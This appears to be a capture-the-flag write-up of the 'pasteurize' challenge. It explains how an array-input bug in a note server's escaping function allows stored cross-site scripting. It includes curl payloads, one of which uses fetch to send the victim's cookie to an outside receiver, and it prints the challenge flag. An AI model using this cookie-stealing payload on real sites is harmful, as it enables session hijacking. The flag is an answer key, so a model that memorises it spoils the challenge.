**Knowledge**:
- XSS Filter Evation
- Javascript

**Task**: We are given a webserver's logic. The server allows us to submit a note and notify the administrator to check our note.

**Investigation**: 
- A classic scenario of cross-site scripting attacks. A malicious script is not properly sanitized, allowing attackers to store the script persistently within a database.
Victims visiting the webpage hosting the script will cause the script to be fetched from the database and is executed in the browsing context of the victim. Thus, it is possible for the attacker to passively steal victim secret data such as token or cookie.

Having said that, our goal is to inject the script. Fortunately, we are given the server's source to understand how input is sanitized on the server's side:

```javascript
app.post('/', async(req,res)=>{
    // Our note's content is stored in variable 'note'
    const note = req.body.content;
    ...
    // Each note is associated with a note_id and is then stored into database
    const result = await DB.add_note(note_id, note);
    });

app.get('/:id..',recaptcha.middle..,async(req,res)=>{
 
    // Get note base on the id
    const note = DB.get_note(note_id);

    // Sanitize the note before rendering
    const unsafe_content = note.content;
    const safe_content = escape_string(unsafe_content);
    });

    // Render it
    res.render('note_public',{
        content: safe_content,
        ...
        })
```

How does `escape_string` work?

```javascript

  const escape_string = unsafe => JSON.stringify(unsafe). // Convert object to string 
                                  slice(1,-1).            // Leave out the 1st and the last item in the string
                                  replace(/</g,'\\\x3e'). // Escape the '<' globally, every instance will be replaced with x3e
                                  replace(/>/g,'\\\x3c')  // Escape the '>' globally
```

So `unsafe` can be either string, or an object ? This is further confirmed as `extended` is set to true in urlencoded. If we send an array `content[]=hello`, the server will receive an object `['hello']`.
Then `unsafe_content` will be the object `['hello']`. Applying the `escape_string`, we obtain the string `"hello"`. Note that the square brackets disappear because of the slice.

We then test our payload and see how the payload is rendered

```bash
curl -v https://pasteurize.web.ctfcompetition.com/ -d 'content[]=hello'

#Rendered page html
// Ops! Unescaped double quotes
const note = ""hello"";
const note_id = "659a2173-9b11-43ac-8658-e18dea463263";
const note_el = document.getElementById('note-content');
const note_url_el = document.getElementById('note-title');
const clean = DOMPurify.sanitize(note);
...
```
The key problem here is the escape_string assumes that unsafe will be string, and the double quotes will be removed by the `slice(1,-1)` to produce a valid string without double quotes. However,
it failed to handle the scenario where an object is converted into a string. As a consequence, it missed handled the square brackets, allowing us to produce double quotes without escaping.
The misused double quotes then pair with existing one, allowing us to inject code in the middle of the `const note`'s line. This observation is further confirmed with the following payload:

```bash
curl -v https://pasteurize.web.ctfcompetition.com/ -d 'content[]=;alert(1);'

#Render page html
// JS engine uses semicolon to separate statements. If a statement is not explicitly terminated with a semicolon, the JS engine will 
// automatically insert semicolon at the end of the statement.
const note = "";alert(1);"";
const note_id = "94d03158-c388-4931-ae18-a3d7149903be";
const note_el = document.getElementById('note-content');
const note_url_el = document.getElementById('note-title');
const clean = DOMPurify.sanitize(note);

```

We use pipedream.com to host our http receive server. We then use the following payload to post the payload, share it with Mike and obtain his cookie:

```bash
curl -v https://pasteurize.web.ctfcompetition.com/ -d "content[]=;fetch('https://REDACT/'%2bdocument.cookie);"

#Response checked on our receiver:
secret = CTF{Express_t0_Tr0ub13s}
```
